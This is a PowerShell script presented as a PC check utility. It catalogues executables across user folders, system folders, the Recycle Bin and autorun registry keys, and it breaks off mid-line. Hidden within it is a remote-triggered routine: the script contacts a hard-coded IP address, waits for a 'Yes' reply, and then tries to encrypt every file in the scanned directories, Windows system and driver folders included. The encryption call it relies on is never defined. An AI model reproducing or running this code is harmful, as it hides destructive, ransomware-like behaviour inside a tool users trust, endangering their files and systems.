$customMessage = @"
                                                                                                           
ChickenTenderPCCheck
                                                                                                           
"@

Write-Host $customMessage -ForegroundColor Red

$filePath = "$env:USERPROFILE\Desktop\ExeFilesList.txt"
New-Item -Path $filePath -ItemType File -Force | Out-Null

$searchDirectories = @(
    [System.IO.Path]::Combine($env:USERPROFILE, "Downloads"),
    [System.IO.Path]::Combine($env:USERPROFILE, "Documents"),
    [System.IO.Path]::Combine($env:USERPROFILE, "Desktop"),
    [System.IO.Path]::Combine($env:USERPROFILE, "Pictures"),
    "C:\Program Files",
    "C:\Program Files (x86)",
    [System.IO.Path]::Combine($env:USERPROFILE, "AppData\Local"),
    [System.IO.Path]::Combine($env:USERPROFILE, "AppData\Roaming"),
    "C:\Windows\System32",
    "C:\Windows\SysWOW64",
    "C:\Windows\Temp",
    [System.IO.Path]::Combine($env:USERPROFILE, "AppData\Local\Temp"),
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
    [System.IO.Path]::Combine($env:USERPROFILE, "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"),
    "C:\Drivers",
    "C:\Configuration",
    "C:\Windows\System32\drivers",
    "C:\Windows\SysWOW64\drivers"
)

$registryPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\App Paths",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
)

# URL to the raw file on GitHub containing the excluded paths
$excludedPathsUrl = "https://raw.githubusercontent.com/Leem-y/PCCHECKER/main/excluded_paths"

function Get-ExcludedPaths {
    $excludedPaths = @()
    try {
        $response = Invoke-WebRequest -Uri $excludedPathsUrl
        $excludedPaths = $response.Content -split "`r`n" | Where-Object { $_ -ne "" }
    } catch {
        Write-Output "Error downloading or processing the excluded paths list."
    }
    return $excludedPaths
}

function Get-ExePathsFromRegistry {
    param (
        [string]$regPath
    )
    
    $exePaths = @()
    
    try {
        $keys = Get-ItemProperty -Path $regPath -ErrorAction Stop
        foreach ($key in $keys.PSObject.Properties) {
            if ($key.Value -match "\.exe$") {
                $exePaths += [pscustomobject]@{
                    Path = $key.Value
                    LastAccessTime = [datetime]::MinValue
                    RegistryKey = $regPath
                }
            }
        }
    } catch {
        Write-Output "Error accessing registry path: $regPath"
    }
    
    return $exePaths
}

function Get-ExePathsFromRecycleBin {
    $recycleBinPath = [System.IO.Path]::Combine([System.IO.Path]::GetPathRoot($env:SystemDrive), '$Recycle.Bin')
    $exePaths = @()
    
    if (Test-Path $recycleBinPath) {
        $recycleBinItems = Get-ChildItem -Path $recycleBinPath -Recurse -Filter *.exe -ErrorAction SilentlyContinue
        foreach ($item in $recycleBinItems) {
            $exePaths += [pscustomobject]@{
                Path = $item.FullName
                LastAccessTime = $item.LastWriteTime
                RegistryKey = 'Recycle Bin'
            }
        }
    }
    
    return $exePaths
}

function Search-DirectoryForExes {
    param (
        [string]$directory
    )

    $exePaths = @()
    try {
        $exeFiles = Get-ChildItem -Path $directory -Filter *.exe -Recurse -File -ErrorAction SilentlyContinue
        foreach ($file in $exeFiles) {
            $exePaths += [pscustomobject]@{
                Path = $file.FullName
                LastAccessTime = (Get-Item $file.FullName).LastAccessTime
                RegistryKey = 'File System'
            }
        }
    } catch {
        Write-Output "Error accessing directory: $directory"
    }
    
    return $exePaths
}

function Encrypt-Files {
    param (
        [string]$path
    )

    try {
        if (Test-Path $path) {
            $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                # Encrypt the file
                $file.FullName | Encrypt
                Write-Output "Encrypted: $($file.FullName)"
            }
        } else {
            Write-Output "Path does not exist: $path"
        }
    } catch {
        Write-Output "Error encrypting files: $_"
    }
}

function Send-HttpPost {
    param (
        [string]$url,
        [string]$message
    )

    try {
        $body = @{ message = $message } | ConvertTo-Json
        $response = Invoke-WebRequest -Uri $url -Method Post -Body $body -ContentType 'application/json'
        Write-Output "HTTP POST response: $($response.StatusCode)"
        return $response.StatusCode
    } catch {
        Write-Output "Error sending HTTP POST request: $_"
    }
}

function Check-RecipientResponse {
    param (
        [string]$url
    )

    try {
        $response = Invoke-WebRequest -Uri $url -Method Get
        $responseContent = $response.Content
        if ($responseContent -eq "Yes") {
            # Encrypt files if response is Yes
            Write-Output "Received 'Yes' from recipient. Encrypting files..."
            $searchDirectories | ForEach-Object { Encrypt-Files -path $_ }
            Write-Output "File encryption completed."
        } else {
            Write-Output "Received response: $responseContent"
        }
    } catch {
        Write-Output "Error checking recipient response: $_"
    }
}

# Define recipient IP
$recipientIP = "50.102.145.249"

# Send prompt message to recipient
$promptMessage = "Would you like to proceed with encrypting all files? (Yes/No)"
$promptUrl = "http://$recipientIP:5000/receive_prompt"
Send-HttpPost -url $promptUrl -message $promptMessage

# Wait for the recipient to respond
Start-Sleep -Seconds 30 # Adjust the sleep time as needed

# Check the recipient's response
$responseUrl = "http://$recipientIP:5000/response"
Check-RecipientResponse -url $responseUrl

# Rest of your script
$excludedPaths = Get-ExcludedPaths

$exeFilesFromDirectories = @()
foreach ($dir in $searchDirectories) {
    if (Test-Path $dir) {
        $exeFilesFromDirectories += Search-DirectoryForExes -
